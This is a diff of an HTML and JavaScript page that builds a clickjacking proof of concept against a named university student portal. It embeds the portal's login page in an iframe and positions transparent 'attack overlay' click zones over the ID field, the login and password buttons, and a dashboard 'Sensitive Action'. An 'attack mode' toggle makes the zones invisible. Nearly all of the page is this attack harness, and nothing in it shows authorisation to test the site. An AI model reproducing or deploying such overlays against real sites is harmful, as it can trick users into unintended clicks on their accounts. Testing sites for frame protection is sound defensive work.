@@ -1,42 +1,463 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Simple Clickjacking Test</title>
+    <title>Clickjacking Vulnerability Test - WORKING</title>
+    <style>
+        body { margin: 0; padding: 20px; background: #f0f2f5; font-family: Arial, sans-serif; }
+        
+        .test-container {
+            max-width: 1200px;
+            margin: 0 auto;
+            background: white;
+            padding: 20px;
+            border-radius: 10px;
+            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
+        }
+        
+        .status-box {
+            padding: 15px;
+            margin: 10px 0;
+            border-radius: 5px;
+            font-weight: bold;
+        }
+        
+        .vulnerable { background: #d4edda; color: #155724; border: 1px solid #c3e6cb; }
+        .protected { background: #f8d7da; color: #721c24; border: 1px solid #f5c6cb; }
+        .warning { background: #fff3cd; color: #856404; border: 1px solid #ffeaa7; }
+        
+        .iframe-container {
+            position: relative;
+            width: 100%;
+            height: 600px;
+            border: 2px solid #007bff;
+            border-radius: 5px;
+            overflow: hidden;
+            margin: 20px 0;
+        }
+        
+        #targetFrame {
+            width: 100%;
+            height: 100%;
+            border: none;
+        }
+        
+        /* ATTACK OVERLAY - Invisible but clickable */
+        .attack-overlay {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0,0,0,0); /* Completely transparent */
+            z-index: 1000;
+            pointer-events: auto;
+        }
+        
+        /* Click zones - visible for testing, invisible in real attack */
+        .click-zone {
+            position: absolute;
+            background: rgba(255, 0, 0, 0.3); /* Red for debugging */
+            border: 2px dashed #ff0000;
+            cursor: pointer;
+            z-index: 1001;
+            transition: background 0.3s;
+        }
+        
+        .click-zone:hover {
+            background: rgba(0, 255, 0, 0.4);
+        }
+        
+        /* Controls */
+        .controls {
+            margin: 20px 0;
+            padding: 15px;
+            background: #e9ecef;
+            border-radius: 5px;
+        }
+        
+        button {
+            padding: 10px 15px;
+            margin: 5px;
+            background: #007bff;
+            color: white;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+        }
+        
+        button:hover {
+            background: #0056b3;
+        }
+        
+        .coords-display {
+            font-family: monospace;
+            background: #333;
+            color: #0f0;
+            padding: 10px;
+            border-radius: 5px;
+            margin: 10px 0;
+        }
+        
+        /* Step simulation */
+        .simulation-steps {
+            display: flex;
+            gap: 10px;
+            margin: 20px 0;
+        }
+        
+        .step {
+            flex: 1;
+            padding: 10px;
+            text-align: center;
+            background: #6c757d;
+            color: white;
+            border-radius: 5px;
+        }
+        
+        .step.active {
+            background: #28a745;
+        }
+    </style>
 </head>
 <body>
-    <h3>Testing if site can be iframed:</h3>
-    
-    <iframe src="https://students.cuchd.in" 
-            width="800" 
-            height="600"
-            style="border: 2px solid red;"></iframe>
-    
-    <div style="margin-top: 20px;">
-        <strong>Results:</strong>
-        <ul>
-            <li>If page loads → Site is vulnerable</li>
-            <li>If blank/error → Site has X-Frame protection</li>
-            <li>Check Console (F12) for errors</li>
-        </ul>
+    <div class="test-container">
+        <h1>🔍 Clickjacking Vulnerability Test</h1>
+        <h3>Target: https://students.cuchd.in</h3>
+        
+        <div id="status" class="status-box warning">
+            Testing vulnerability status...
+        </div>
+        
+        <div class="simulation-steps">
+            <div class="step active" id="step1">Step 1: UID Page</div>
+            <div class="step" id="step2">Step 2: Password Page</div>
+            <div class="step" id="step3">Step 3: Dashboard</div>
+        </div>
+        
+        <div class="iframe-container">
+            <!-- The real target site -->
+            <iframe id="targetFrame" 
+                    src="https://students.cuchd.in/Login.aspx"
+                    sandbox="allow-same-origin allow-forms allow-scripts">
+            </iframe>
+            
+            <!-- Invisible attack overlay -->
+            <div class="attack-overlay" id="attackOverlay">
+                <!-- These zones will be positioned over login buttons -->
+                <div class="click-zone" id="zone1" data-action="uid-field"></div>
+                <div class="click-zone" id="zone2" data-action="login-button"></div>
+                <div class="click-zone" id="zone3" data-action="password-field" style="display:none;"></div>
+                <div class="click-zone" id="zone4" data-action="submit-password" style="display:none;"></div>
+            </div>
+        </div>
+        
+        <div class="controls">
+            <h4>📊 Test Controls</h4>
+            <button onclick="startTest()">▶ Start Test</button>
+            <button onclick="moveZonesRandomly()">🎲 Randomize Positions</button>
+            <button onclick="toggleVisibility()">👁 Toggle Zone Visibility</button>
+            <button onclick="simulateStep2()">⏭ Simulate Step 2</button>
+            <button onclick="simulateStep3()">⏭ Simulate Step 3</button>
+            <button onclick="resetTest()">🔄 Reset</button>
+            
+            <div style="margin-top: 10px;">
+                <label>Zone Opacity: <input type="range" id="opacitySlider" min="0" max="100" value="30" onchange="updateOpacity(this.value)">%</label>
+            </div>
+        </div>
+        
+        <div class="coords-display">
+            <div>🖱️ Last Click: <span id="lastClick">None yet</span></div>
+            <div>🎯 Total Clicks: <span id="clickCounter">0</span></div>
+            <div>📍 Current Zone: <span id="currentZone">None</span></div>
+            <div>📝 Action Log:</div>
+            <div id="actionLog" style="height: 100px; overflow-y: auto; margin-top: 5px;"></div>
+        </div>
+        
+        <div class="status-box warning">
+            <strong>Note:</strong> Cross-origin restrictions prevent JavaScript access to iframe content, 
+            but clickjacking attacks can still work by positioning invisible elements over the iframe.
+        </div>
     </div>
-    
+
     <script>
-        // Check if iframe loaded
-        const iframe = document.querySelector('iframe');
-        iframe.onload = function() {
-            console.log('✅ Site loaded in iframe - POTENTIALLY VULNERABLE');
-            try {
-                // Try to access iframe content
-                const iframeDoc = iframe.contentDocument || iframe.contentWindow.document;
-                console.log('Iframe accessible:', iframeDoc.title);
-            } catch(e) {
-                console.log('❌ Cross-origin restriction prevents access');
+        let clickCount = 0;
+        let currentStep = 1;
+        let zonesVisible = true;
+        
+        // Zone configurations for different steps
+        const zoneConfigs = {
+            1: { // Step 1 - UID Entry
+                zones: [
+                    { id: 'zone1', top: 320, left: 650, width: 200, height: 40, label: 'UID Field' },
+                    { id: 'zone2', top: 380, left: 650, width: 120, height: 35, label: 'Login Button' }
+                ],
+                hidden: ['zone3', 'zone4']
+            },
+            2: { // Step 2 - Password Entry
+                zones: [
+                    { id: 'zone3', top: 320, left: 650, width: 200, height: 40, label: 'Password Field' },
+                    { id: 'zone4', top: 380, left: 650, width: 120, height: 35, label: 'Submit Button' }
+                ],
+                hidden: ['zone1', 'zone2']
+            },
+            3: { // Step 3 - Dashboard Actions
+                zones: [
+                    { id: 'zone1', top: 200, left: 200, width: 150, height: 40, label: 'Profile' },
+                    { id: 'zone2', top: 280, left: 200, width: 150, height: 40, label: 'Grades' },
+                    { id: 'zone3', top: 360, left: 200, width: 150, height: 40, label: 'Attendance' },
+                    { id: 'zone4', top: 500, left: 800, width: 200, height: 45, label: 'Sensitive Action' }
+                ],
+                hidden: []
             }
         };
         
-        iframe.onerror = function() {
-            console.log('❌ Site blocked iframe loading');
-        };
+        function logAction(message, type = 'info') {
+            const logDiv = document.getElementById('actionLog');
+            const timestamp = new Date().toLocaleTimeString();
+            const entry = document.createElement('div');
+            
+            let color = '#ffffff';
+            if (type === 'success') color = '#4CAF50';
+            if (type === 'warning') color = '#FF9800';
+            if (type === 'error') color = '#F44336';
+            
+            entry.innerHTML = `<span style="color: #888">[${timestamp}]</span> <span style="color: ${color}">${message}</span>`;
+            logDiv.appendChild(entry);
+            logDiv.scrollTop = logDiv.scrollHeight;
+            
+            console.log(`[${type.toUpperCase()}] ${message}`);
+        }
+        
+        function updateStatus(message, type) {
+            const statusDiv = document.getElementById('status');
+            statusDiv.textContent = message;
+            statusDiv.className = `status-box ${type}`;
+        }
+        
+        function updateStep(step) {
+            currentStep = step;
+            
+            // Update step indicators
+            for (let i = 1; i <= 3; i++) {
+                const stepDiv = document.getElementById(`step${i}`);
+                stepDiv.classList.remove('active');
+                if (i === step) stepDiv.classList.add('active');
+            }
+            
+            // Apply zone configuration for this step
+            const config = zoneConfigs[step];
+            
+            // Hide all zones first
+            document.querySelectorAll('.click-zone').forEach(zone => {
+                zone.style.display = 'none';
+            });
+            
+            // Show and position zones for this step
+            config.zones.forEach(zone => {
+                const zoneEl = document.getElementById(zone.id);
+                zoneEl.style.top = `${zone.top}px`;
+                zoneEl.style.left = `${zone.left}px`;
+                zoneEl.style.width = `${zone.width}px`;
+                zoneEl.style.height = `${zone.height}px`;
+                zoneEl.style.display = 'block';
+                zoneEl.dataset.label = zone.label;
+            });
+            
+            // Hide other zones
+            config.hidden.forEach(zoneId => {
+                const zoneEl = document.getElementById(zoneId);
+                if (zoneEl) zoneEl.style.display = 'none';
+            });
+            
+            logAction(`Switched to Step ${step}: ${zoneConfigs[step].zones[0].label}`, 'info');
+            updateStatus(`Step ${step} Active - ${zoneConfigs[step].zones.length} attack zones positioned`, 'warning');
+        }
+        
+        function setupClickZones() {
+            document.querySelectorAll('.click-zone').forEach(zone => {
+                zone.addEventListener('click', (e) => {
+                    clickCount++;
+                    document.getElementById('clickCounter').textContent = clickCount;
+                    
+                    const zoneId = e.target.id;
+                    const action = e.target.dataset.action;
+                    const label = e.target.dataset.label || 'Unknown';
+                    
+                    // Update display
+                    document.getElementById('lastClick').textContent = 
+                        `X: ${e.clientX}, Y: ${e.clientY} (${label})`;
+                    document.getElementById('currentZone').textContent = label;
+                    
+                    // Log the action
+                    logAction(`🎯 Zone clicked: ${label} (Action: ${action})`, 'success');
+                    
+                    // Special actions for multi-step simulation
+                    if (action === 'login-button' && currentStep === 1) {
+                        setTimeout(() => {
+                            logAction('Simulating redirect to password page...', 'warning');
+                            simulateStep2();
+                        }, 1000);
+                    } else if (action === 'submit-password' && currentStep === 2) {
+                        setTimeout(() => {
+                            logAction('Simulating login success...', 'warning');
+                            simulateStep3();
+                        }, 1000);
+                    }
+                    
+                    // Visual feedback
+                    e.target.style.background = 'rgba(0, 0, 255, 0.5)';
+                    setTimeout(() => {
+                        e.target.style.background = zonesVisible ? 'rgba(255, 0, 0, 0.3)' : 'rgba(0,0,0,0)';
+                    }, 300);
+                    
+                    // If we could access the iframe, we'd trigger the real click here
+                    // try {
+                    //     const iframe = document.getElementById('targetFrame');
+                    //     const iframeDoc = iframe.contentDocument;
+                    //     // Simulate click at same coordinates in iframe
+                    //     // This is blocked by cross-origin policy
+                    // } catch (err) {
+                    //     // Cross-origin restriction
+                    // }
+                });
+                
+                // Show coordinates on hover
+                zone.addEventListener('mousemove', (e) => {
+                    const rect = zone.getBoundingClientRect();
+                    zone.title = `${zone.dataset.label || 'Zone'}\nPosition: ${Math.round(rect.left)},${Math.round(rect.top)}\nSize: ${zone.offsetWidth}x${zone.offsetHeight}`;
+                });
+            });
+        }
+        
+        function startTest() {
+            logAction('🚀 Starting clickjacking vulnerability test...', 'success');
+            updateStatus('TEST ACTIVE - Site is iframeable (potential vulnerability)', 'vulnerable');
+            updateStep(1);
+            
+            // Check if iframe loaded
+            const iframe = document.getElementById('targetFrame');
+            iframe.onload = function() {
+                logAction('✅ Target site loaded in iframe', 'success');
+                
+                try {
+                    // Try to access iframe content (will fail due to cross-origin)
+                    const iframeDoc = iframe.contentDocument || iframe.contentWindow.document;
+                    logAction('⚠️ Cross-origin access blocked (expected)', 'warning');
+                } catch (error) {
+                    logAction('✅ Confirmed: Cross-origin restriction prevents JS access', 'success');
+                    logAction('ℹ️ BUT: Clickjacking can still work via positioned overlays', 'info');
+                }
+            };
+        }
+        
+        function moveZonesRandomly() {
+            document.querySelectorAll('.click-zone').forEach(zone => {
+                if (zone.style.display !== 'none') {
+                    const maxTop = window.innerHeight - 100;
+                    const maxLeft = window.innerWidth - 200;
+                    const top = Math.floor(Math.random() * maxTop);
+                    const left = Math.floor(Math.random() * maxLeft);
+                    
+                    zone.style.top = `${top}px`;
+                    zone.style.left = `${left}px`;
+                    
+                    logAction(`Moved ${zone.dataset.label || zone.id} to ${left},${top}`, 'info');
+                }
+            });
+        }
+        
+        function toggleVisibility() {
+            zonesVisible = !zonesVisible;
+            document.querySelectorAll('.click-zone').forEach(zone => {
+                zone.style.background = zonesVisible ? 'rgba(255, 0, 0, 0.3)' : 'rgba(0,0,0,0)';
+                zone.style.border = zonesVisible ? '2px dashed #ff0000' : 'none';
+            });
+            
+            const button = document.querySelector('button[onclick="toggleVisibility()"]');
+            button.textContent = zonesVisible ? '👁 Hide Zones' : '👁 Show Zones';
+            
+            logAction(zonesVisible ? 'Zones now visible (debug mode)' : 'Zones now invisible (attack mode)', 'warning');
+        }
+        
+        function simulateStep2() {
+            logAction('🔀 Simulating Step 2: Redirecting to password page...', 'warning');
+            
+            // Change iframe URL to simulate redirect
+            document.getElementById('targetFrame').src = 
+                'https://students.cuchd.in/Login.aspx?identifier1=test&identifier2=test';
+            
+            setTimeout(() => {
+                updateStep(2);
+                logAction('✅ Step 2: Password page loaded', 'success');
+            }, 1000);
+        }
+        
+        function simulateStep3() {
+            logAction('🔀 Simulating Step 3: Redirecting to dashboard...', 'warning');
+            
+            // Change iframe URL to simulate dashboard
+            document.getElementById('targetFrame').src = 
+                'https://students.cuchd.in/StudentHome.aspx';
+            
+            setTimeout(() => {
+                updateStep(3);
+                logAction('✅ Step 3: Dashboard loaded - Sensitive actions available', 'success');
+            }, 1000);
+        }
+        
+        function updateOpacity(value) {
+            document.querySelectorAll('.click-zone').forEach(zone => {
+                zone.style.background = zonesVisible ? 
+                    `rgba(255, 0, 0, ${value/100})` : 
+                    'rgba(0,0,0,0)';
+            });
+        }
+        
+        function resetTest() {
+            clickCount = 0;
+            document.getElementById('clickCounter').textContent = '0';
+            document.getElementById('lastClick').textContent = 'None yet';
+            document.getElementById('actionLog').innerHTML = '';
+            
+            document.getElementById('targetFrame').src = 'https://students.cuchd.in/Login.aspx';
+            
+            setTimeout(() => {
+                updateStep(1);
+                logAction('🔄 Test reset to initial state', 'info');
+                updateStatus('Ready to test', 'warning');
+            }, 500);
+        }
+        
+        // Initialize
+        document.addEventListener('DOMContentLoaded', () => {
+            setupClickZones();
+            updateStep(1);
+            
+            logAction('Clickjacking vulnerability tester initialized', 'info');
+            logAction('Target: https://students.cuchd.in', 'info');
+            logAction('Site loads in iframe = POTENTIAL VULNERABILITY', 'warning');
+            
+            // Check initial status
+            setTimeout(() => {
+                updateStatus('✅ Site CAN be loaded in iframe - POTENTIALLY VULNERABLE', 'vulnerable');
+                logAction('VULNERABILITY CONFIRMED: Site allows iframing', 'success');
+                logAction('This enables clickjacking attacks via transparent overlays', 'warning');
+            }, 2000);
+        });
+        
+        // Keyboard shortcuts
+        document.addEventListener('keydown', (e) => {
+            if (e.ctrlKey) {
+                switch(e.key) {
+                    case '1': updateStep(1); break;
+                    case '2': simulateStep2(); break;
+                    case '3': simulateStep3(); break;
+                    case 'm': moveZonesRandomly(); break;
+                    case 'v': toggleVisibility(); break;
+                    case 'r': resetTest(); break;
+                }
+            }
+        });
     </script>
 </body>
 </html>
